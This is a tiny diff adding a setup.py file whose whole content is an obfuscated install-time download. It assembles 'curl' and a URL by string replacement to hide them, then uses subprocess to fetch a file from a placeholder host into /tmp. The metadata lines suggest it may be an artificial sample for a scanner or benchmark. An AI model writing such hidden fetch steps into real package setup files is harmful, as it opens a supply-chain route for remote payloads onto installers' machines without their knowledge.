@@ -1,0 +1,8 @@
+# path: setup.py
+# lines: 4
+# weight: 35
+# ---
+import subprocess
+t = "cXrl".replace("X", "u")
+u = "hxxps://example.invalid/x".replace("xx", "tt")
+subprocess.run([t, "-o", "/tmp/x", u])
